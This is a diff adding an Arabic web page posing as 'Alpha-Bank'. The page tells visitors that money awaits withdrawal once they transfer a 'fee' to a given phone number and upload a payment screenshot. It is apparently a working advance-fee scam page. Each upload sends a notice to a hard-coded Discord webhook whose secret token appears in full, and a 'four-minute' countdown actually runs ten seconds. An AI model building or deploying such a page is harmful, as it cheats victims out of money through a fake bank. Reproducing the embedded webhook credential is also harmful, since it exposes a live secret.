@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استلام أموال - Alpha-Bank</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css">
+    <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
+    <meta property="og:title" content="استلام أموال - Alpha-Bank">
+    <meta property="og:description" content="يمكنك استلام أموالك بسهولة عبر Alpha-Bank، تأكد من دفع الرسوم لإتمام العملية.">
+    <meta property="og:url" content="https://ahmed-1650egy.glitch.me/">
+    <meta property="og:type" content="website">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background: url('https://images.pexels.com/photos/442579/pexels-photo-442579.jpeg') no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            backdrop-filter: blur(5px);
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 20px;
+            width: 400px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 0 15px cyan;
+            position: relative;
+        }
+
+        .bank-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .bank-header img {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            box-shadow: 0 0 10px cyan;
+        }
+
+        .bank-header h1 {
+            color: cyan;
+            font-size: 24px;
+        }
+
+        h2 {
+            color: cyan;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: white;
+            opacity: 0.8;
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 8px 10px;
+            margin-bottom: 8px;
+            border-radius: 5px;
+            box-shadow: 0 0 8px cyan;
+            text-align: right;
+            color: white;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            flex-direction: row-reverse;
+            width: fit-content;
+            margin-left: auto;
+        }
+
+        .input-box i {
+            color: white;
+            font-size: 18px;
+        }
+
+        .number {
+            color: cyan;
+            font-weight: bold;
+        }
+
+        .pay-btn {
+            background: cyan;
+            color: black;
+            font-size: 16px;
+            padding: 10px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.3s ease-in-out;
+            border-radius: 5px;
+            font-weight: bold;
+            box-shadow: 0 0 12px cyan;
+            margin-top: 10px;
+        }
+
+        .pay-btn:hover {
+            box-shadow: 0 0 20px 5px cyan, 0 0 40px 10px rgba(0, 255, 255, 0.8);
+            transform: scale(1.05);
+        }
+
+        .upload-btn {
+            margin-top: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .upload-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .screenshot-preview {
+            width: 100px;
+            height: 100px;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            border-radius: 5px;
+            box-shadow: 0 0 10px cyan;
+            margin: 10px auto;
+        }
+
+        .screenshot-preview img {
+            max-width: 100%;
+            max-height: 100%;
+            border-radius: 5px;
+        }
+
+        .amount-box {
+            background: rgba(0, 255, 255, 0.1);
+            color: cyan;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px cyan;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        .popup {
+    background-color: rgba(0, 0, 0, 0.8);
+    color: white;
+    padding: 20px;
+    text-align: center;
+    border-radius: 10px;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: none;
+}
+        .warning {
+            display: none;
+            color: #ff0055;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 10px;
+            text-shadow: 0 0 10px #ff0055, 0 0 20px #ff0055;
+        }
+
+        .timer {
+            display: none;
+            font-size: 18px;
+            color: cyan;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="bank-header">
+            <img id="avatar" src="" alt="صورة الحساب" />
+            <h2 id="username"> -  استلام أموال</h2>
+
+        </div>
+        <h1>Alpha-Bank</h1>
+        <h2>المبلغ المتاح سحبه حاليا.</h2>
+              <div class="amount-box"><span id="balance">جاري التحميل...</span> EGP </div>
+              <p>لإتمام السحب، قم بإيداع </p>
+              <div class="amount-box"><span id="taxAmount">جاري التحميل...</span> EGP </div>
+              <i class='bx bxs-data' style="color: cyan;"></i>
+              <p>علمًا بأن المبلغ مطلوب لدفع الرسوم</p>              
+
+            <p><strong>معرف العملية:</strong> <span id="userId"></span></p>
+
+            <div class="input-box">
+                <i class="bx bxs-phone"></i>
+                <span class="number"><span id="sendNumber">جاري التحميل...</span></span>  قم بالتحويل الى الرقم التالي - 
+            </div>
+
+        <div class="input-box">
+            <i class="bx bxs-phone"></i>
+            <span class="number"><span id="receiveNumber">جاري التحميل...</span></span>  رقم استلام الارباح - 
+        </div>
+
+        <div class="screenshot-preview" id="preview"></div>
+
+        <button class="pay-btn" id="payBtn" onclick="validatePayment()">تأكيد دفع الرسوم</button>
+        <label class="upload-btn">
+            رفع لقطة شاشة
+            <input type="file" id="screenshot" style="display: none;" accept="image/*" onchange="previewScreenshot()">
+        </label>
+
+        <p class="warning" id="warning">إذا قمت برفع صورة خاطئة او متأخره، ستُرفض العملية. قم بالتحويل إلى رقم المرسل ورفع صورة صحيحة!</p>
+        <p class="timer" id="timer"></p>
+        
+<!-- نافذة منبثقة للتنبيه عند رفع صورة -->
+<div id="popup" class="popup" style="display: none;">
+    <p>تم رفع الصورة بنجاح!</p>
+    <p id="popup-timer">انتظر : <span id="countdown">04:00 دقايق</span></p>
+</div>
+    </div>
+
+        <div id="loading" class="loading">جاري تحميل البيانات...</div> <!-- رسالة تحميل -->
+    </div>
+    <script>
+        // تحميل بيانات المستخدم عند فتح الصفحة
+        async function fetchUserData() {
+            try {
+                // عرض مؤشر التحميل
+                document.getElementById("loading").style.display = "block";
+    
+                const response = await fetch('/');
+                if (!response.ok) {
+                    console.error("فشل في جلب البيانات، إعادة توجيه...");
+                    window.location.href = '/';
+                    return;
+                }
+    
+                const data = await response.json();
+    
+                // تعيين المعلومات في الصفحة
+                document.getElementById("username").textContent = data.username || "مستخدم غير معروف";
+                document.getElementById("userId").textContent = String(data.id) || "غير متوفر";
+                document.getElementById("balance").textContent = data.balance + "";  // عرض الرصيد
+                document.getElementById("receiveNumber").textContent = data.receiveNumber || "غير متوفر"; // عرض رقم الاستلام
+                document.getElementById("sendNumber").textContent = data.sendNumber || "غير متوفر"; // عرض رقم الإرسال
+                document.getElementById("taxAmount").textContent = data.taxAmount  || "غير متوفر"; // عرض مبلغ الضرائب
+    
+                // التأكد من أن البيانات تحتوي على معرف الصورة الصحيح
+                let avatarUrl = 'https://cdn.discordapp.com/embed/avatars/0.png'; // الصورة الافتراضية
+    
+                if (data.avatar) {
+                    // التأكد مما إذا كان avatar رابطًا كاملًا أم مجرد hash
+                    if (data.avatar.startsWith("https://")) {
+                        avatarUrl = data.avatar; // إذا كان رابط كامل، استخدمه مباشرةً
+                    } else {
+                        avatarUrl = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png?size=256`;
+                    }
+                }
+    
+                console.log("الرابط النهائي للصورة:", avatarUrl);
+    
+                // تعيين الصورة
+                const avatarImg = document.getElementById("avatar");
+                avatarImg.src = avatarUrl;
+    
+                // في حالة فشل تحميل الصورة، يتم استبدالها بالصورة الافتراضية
+                avatarImg.onerror = function() {
+                    console.error("فشل تحميل الصورة، سيتم تعيين الصورة الافتراضية");
+                    avatarImg.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
+                };
+    
+                // إخفاء مؤشر التحميل
+                document.getElementById("loading").style.display = "none";
+    
+            } catch (error) {
+                console.error('خطأ أثناء تحميل البيانات:', error);
+                document.getElementById("loading").style.display = "none"; // إخفاء مؤشر التحميل في حالة الخطأ
+            }
+        }
+    
+        // وظيفة تسجيل الخروج
+        function logout() {
+            fetch('/auth/logout').then(() => window.location.href = '/');
+        }
+    
+        // معاينة الصورة ورفعها
+        function previewScreenshot() {
+            const input = document.getElementById('screenshot');
+            const preview = document.getElementById('preview');
+            const warning = document.getElementById('warning');
+            const popup = document.getElementById('popup');
+            const timerDisplay = document.getElementById('countdown');  // تعريف المتغير للتوقيت
+    
+            if (input.files.length > 0) {
+                const file = input.files[0];
+                const reader = new FileReader();
+    
+                reader.onload = function(e) {
+                    // إذا تم رفع صورة
+                    preview.innerHTML = `<img src="${e.target.result}" alt="لقطة الشاشة">`;
+                    preview.style.display = "flex";
+                    warning.style.display = "none";  // إخفاء التحذير
+    
+                    // إرسال إشعار عبر الويب هوك
+                    fetch('https://discord.com/api/webhooks/1356644851969429605/_8qJiU383-7bIVfO1H8ENZr87hf2cYmYzAs8uouw26O_j5TjromioLQEgSBuysY73xLx', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: "تم رفع صورة جديدة. من فضلك تأكد من صحتها!",
+                        }),
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('فشل إرسال الويب هوك');
+                        }
+                        return response.text();
+                    })
+                    .then(data => {
+                        console.log('تم إرسال الويب هوك بنجاح:', data);
+                    })
+                    .catch(error => {
+                        console.error('حدث خطأ:', error);
+                    });
+    
+                    // إظهار نافذة منبثقة مع التايمر
+                    popup.style.display = "block"; 
+                    startTimer();  // بدء التايمر لمدة 4 دقائق
+                };
+    
+                reader.readAsDataURL(file);
+            } else {
+                // إذا لم يتم رفع صورة، عرض التحذير
+                warning.style.display = "block";
+                popup.style.display = "none";  // إخفاء النافذة المنبثقة
+            }
+        }
+    
+        // وظيفة بدء التايمر لمدة 4 دقائق
+        function startTimer() {
+            let time = 10; // 4 دقائق بالثواني
+            const timerDisplay = document.getElementById('countdown');  // التأكد من تعريف العنصر
+    
+            const interval = setInterval(function() {
+                let minutes = Math.floor(time / 60);
+                let seconds = time % 60;
+    
+                // إضافة صفر أمام الأرقام الفردية
+                minutes = minutes < 10 ? '0' + minutes : minutes;
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+    
+                // عرض التوقيت
+                timerDisplay.innerHTML = `${minutes}:${seconds}`;
+    
+                // تقليل الوقت
+                time--;
+    
+                // عند الانتهاء من التوقيت، التوقف
+                if (time < 0) {
+                    clearInterval(interval);
+                    alert('انتهت مدة الانتظار!');
+                    // هنا يمكن إضافة منطق آخر لتنفيذ شيء بعد انتهاء التوقيت
+                }
+            }, 1000); // التكرار كل ثانية
+        }
+    
+    // دالة validatePayment لعرض التحذير إذا لم يتم رفع صورة
+    function validatePayment() {
+        const input = document.getElementById('screenshot');
+        const warning = document.getElementById('warning');
+        const popup = document.getElementById('popup');
+
+        if (input.files.length === 0) {
+            // إذا لم يتم رفع صورة، عرض التحذير
+            warning.style.display = "block";
+            popup.style.display = "none";  // إخفاء النافذة المنبثقة
+        } else {
+            // إذا تم رفع صورة، عرض النافذة المنبثقة مع التايمر
+            previewScreenshot();
+        }
+    }
+
+        // استدعاء تحميل البيانات عند بداية تحميل الصفحة
+        fetchUserData();
+    </script>
+    
+</body>
+</html>
